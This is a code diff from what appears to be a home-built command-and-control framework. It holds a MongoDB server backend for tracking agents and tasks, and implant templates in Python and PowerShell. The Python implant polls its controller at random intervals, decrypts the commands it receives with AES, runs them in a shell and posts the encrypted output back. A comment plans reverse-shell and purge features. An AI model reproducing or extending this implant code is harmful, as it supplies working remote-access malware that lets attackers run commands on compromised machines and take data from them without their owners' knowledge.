@@ -4,16 +4,21 @@ from hashlib import sha256
 client = MongoClient('mongodb://localhost:27017/')
 db = client.C2
 
+''' 
+To-Do: 
+1- Handle bad requested tasks (bad commands)
+2- Delete the task after writing its result
+'''
 
-def registerAgent(agentID, agentIP, BindlistenerId, timeout=86400):
+def registerAgent(agentID, BindlistenerId, timeout=86400):
 
     agent = {'id': agentID,
              'timeout': timeout,
-             'ip': agentIP,
+             'ip': '',
              'task': '',
-             'status': '',
+             'status': 'dead',
              'taskResult': '',
-             'BindlistenerId': BindlistenerId
+             'BindlistenerId': BindlistenerId 
              }
 
     db.agents.insert_one(agent)
@@ -49,6 +54,8 @@ def delListener(id):
         return False
 
 
+
+
 def checkTask(agentID):
     task = db.agents.find_one({'id': {'$eq': agentID}}).get('task')
 
@@ -56,7 +63,7 @@ def checkTask(agentID):
         return task
 
     else:
-        return '0'
+        return 
 
 
 def clearTask(agentID):
@@ -85,7 +92,7 @@ def writeResult(agentID, result):
         'id': agentID},
         {
         '$set': {
-            'taskResult': ''
+            'taskResult': result
         }
     })
 
@@ -96,6 +103,12 @@ def getKey(id):
             '$eq': id}
     }).get('key')
 
+
+def checkListenerPort(port):
+    return db.listeners.find_one({
+        'port': {
+            '$eq': port}
+    })
 
 def getAgentListener(agentID):
     return db.agents.find_one({
@@ -129,10 +142,13 @@ _PORT_ = 'REPLACE_PORT'
 _ID_ = 'REPLACE_ID' 
 _KEY_ = 'REPLACE_KEY'
 
+
 #add encrytion and decryption FCNs
 def encrypt(task):
+    base64_bytes = _KEY_.encode("ascii")
+    key = b64decode(base64_bytes)
     IV = os.urandom(16)
-    c = AES.new(_KEY_, AES.MODE_CBC, IV)
+    c = AES.new(key, AES.MODE_CBC, IV)
     ct = IV + c.encrypt(pad(bytes(task, 'utf-8'),AES.block_size))
     base64_bytes = b64encode(ct)
     cipher = base64_bytes.decode("ascii")
@@ -140,10 +156,12 @@ def encrypt(task):
 
 
 def decrypt(eresult):
+    base64_bytes = _KEY_.encode("ascii")
+    key = b64decode(base64_bytes)
     base64_bytes = eresult.encode("ascii")
     result = b64decode(base64_bytes)
     IV = result[:AES.block_size]
-    cipher = AES.new(_KEY_, AES.MODE_CBC, IV)
+    cipher = AES.new(key, AES.MODE_CBC, IV)
     pt = cipher.decrypt(result[AES.block_size:])
     pt = unpad(pt,16).decode('utf-8')
     return pt
@@ -156,7 +174,7 @@ if __name__ == "__main__":
     while (True): 
         seed()
         sleep(randint(0,20)) 
-        response = r.post(url= _C2_ + "/reg/{}".format(_ID_)) 
+        response = r.get(url= _C2_ + "/reg/{}".format(_ID_)) 
         print(response.text)
         
         if ("Success" in response.text): 
@@ -171,14 +189,17 @@ if __name__ == "__main__":
         sleep(randint(0,20)) 
         task = r.get(url= _C2_ + "/task/{}".format(_ID_)) 
         #add aliases for reverse shell and purging  
-        if (task.text != '0'): 
+        if (task.text): 
             #decrypting data bfore executing command
+            print(task.text)
             cmd = decrypt(task.text)
+            print(cmd)
             result = encrypt(os.popen('echo "{}" | sh'.format(cmd)).read())
+            print(result)
             if (result == ''): 
                 result = "Task completed but has no output"
             
-            r.post(url= _C2_ + '/task/results/{}'.format(_ID_), data= {'results': b64encode(result.encode())}) 
+            r.post(url= _C2_ + '/task/results/{}'.format(_ID_), data = result.encode('ascii')) 
          
         else: 
             continue'''
@@ -235,7 +256,7 @@ $port = "REPLACE_PORT"
 $id = "REPLACE_ID"
 $key = "KEY"
 $reguri = ("http" + ':' + "//$ip" + ':' + "$port/reg/$id")
-$name = (Invoke-WebRequest -UseBasicParsing -Uri $reguri -Method 'POST').Content
+$name = (Invoke-WebRequest -UseBasicParsing -Uri $reguri -Method 'GET').Content
 
 
 if ($name -eq "Success"){
